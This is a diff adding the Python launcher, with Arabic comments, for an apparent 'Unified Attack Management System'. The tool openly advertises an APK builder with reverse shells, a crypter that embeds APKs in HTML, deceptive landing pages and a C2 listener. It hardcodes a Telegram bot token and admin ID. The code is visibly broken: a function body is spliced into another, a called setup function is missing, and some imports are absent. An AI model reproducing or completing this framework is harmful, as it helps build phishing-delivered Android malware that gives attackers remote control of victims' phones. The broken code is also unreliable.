@@ -1,0 +1,156 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+UAMS Framework - Main Entry Point
+Unified Attack Management System Launcher
+Starts Flask App + Telegram Bot with Auto-Database Initialization
+"""
+
+import os
+import sys
+import asyncio
+import logging
+import threading
+import time
+from datetime import datetime
+from pathlib import Path
+
+# ============================================================
+# Configuration
+# ============================================================
+
+BOT_TOKEN = "8767603081:AAFh4oIHNWjk3kthpFs71J5Daa1d6seKmy4"
+ADMIN_USER_ID = 7954796098
+SERVER_HOST = "0.0.0.0"
+SERVER_PORT = int(os.environ.get('PORT', 5000))
+DATABASE_PATH = "backend/database/cybersec.db"
+
+# Setup logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# ============================================================
+# Step 1: Check and Install Dependencies
+# ============================================================
+
+def check_dependencies():
+        'backend/static'
+    ]
+    
+    for directory in directories:
+        os.makedirs(directory, exist_ok=True)
+        print(f"  [✓] {directory}")
+    
+    print("[✓] تم إعداد المجلدات")
+
+def check_android_tools():
+    """التحقق من أدوات Android"""
+    print("[+] التحقق من أدوات Android...")
+    
+    required_tools = ['java', 'keytool', 'jarsigner']
+    missing_tools = []
+    
+    for tool in required_tools:
+        try:
+            subprocess.run([tool, '-version'], capture_output=True, check=True)
+            print(f"  [✓] {tool}")
+        except:
+            missing_tools.append(tool)
+            print(f"  [-] {tool} غير مثبت")
+    
+    if missing_tools:
+        print("\n[!] تحذير: بعض أدوات Android غير مثبتة")
+        print("[!] بعض الميزات قد لا تعمل بشكل كامل")
+        print("[!] تأكد من تثبيت Java JDK و Android SDK")
+
+def start_backend():
+    """تشغيل لوحة التحكم الخلفية"""
+    print("[+] تشغيل لوحة التحكم...")
+    
+    # استيراد وتشغيل Flask
+    from backend.app import app, uams
+    
+    # بدء النظام
+    uams.start()
+    
+    # فتح المتصفح تلقائياً
+    webbrowser.open('http://127.0.0.1:8080')
+    
+    # تشغيل خادم Flask
+    app.run(host='0.0.0.0', port=8080, debug=False)
+
+def show_banner():
+    """عرض شعار النظام"""
+    banner = """
+    ╔══════════════════════════════════════════════════════════════╗
+    ║                                                              ║
+    ║   ██╗   ██╗ █████╗ ███╗   ███╗███████╗                      ║
+    ║   ██║   ██║██╔══██╗████╗ ████║██╔════╝                      ║
+    ║   ██║   ██║███████║██╔████╔██║███████╗                      ║
+    ║   ╚██╗ ██╔╝██╔══██║██║╚██╔╝██║╚════██║                      ║
+    ║    ╚████╔╝ ██║  ██║██║ ╚═╝ ██║███████║                      ║
+    ║     ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝                      ║
+    ║                                                              ║
+    ║       Unified Attack Management System (UAMS)                ║
+    ║            إطار عمل متكامل لإدارة الهجمات                     ║
+    ║                     Version 1.0                              ║
+    ║                                                              ║
+    ╚══════════════════════════════════════════════════════════════╝
+    
+    [*] System Initialization...
+    """
+    print(banner)
+
+def main():
+    """الدالة الرئيسية"""
+    try:
+        # عرض الشعار
+        show_banner()
+        
+        # التحقق من التبعيات
+        check_dependencies()
+        
+        # إعداد المجلدات
+        setup_directories()
+        
+        # التحقق من أدوات Android
+        check_android_tools()
+        
+        print("\n" + "="*60)
+        print("          UAMS FRAMEWORK READY")
+        print("="*60)
+        
+        print("\n[*] الميزات المتوفرة:")
+        print("  1. ✅ APK Builder - بناء تطبيقات مع Reverse Shell")
+        print("  2. ✅ Crypter Engine - تشفير وتضمين APK في HTML")
+        print("  3. ✅ Landing Page Generator - صفحات ويب مخادعة")
+        print("  4. ✅ C2 Listener - إدارة Reverse Shells")
+        print("  5. ✅ Web Dashboard - لوحة تحكم ويب متكاملة")
+        
+        print("\n[*] روابط النظام:")
+        print("  • Dashboard: http://127.0.0.1:8080")
+        print("  • C2 Listener: 127.0.0.1:4444")
+        print("  • Web Server: http://127.0.0.1:8000")
+        
+        print("\n[*] اضغط Enter لبدء التشغيل...")
+        input()
+        
+        # تشغيل النظام
+        start_backend()
+        
+    except KeyboardInterrupt:
+        print("\n\n[!] تم إيقاف النظام بواسطة المستخدم")
+        sys.exit(0)
+    except Exception as e:
+        print(f"\n[-] خطأ غير متوقع: {e}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    # تغيير المسار للدليل الحالي
+    os.chdir(os.path.dirname(os.path.abspath(__file__)))
+    
+    # تشغيل النظام
+    main()
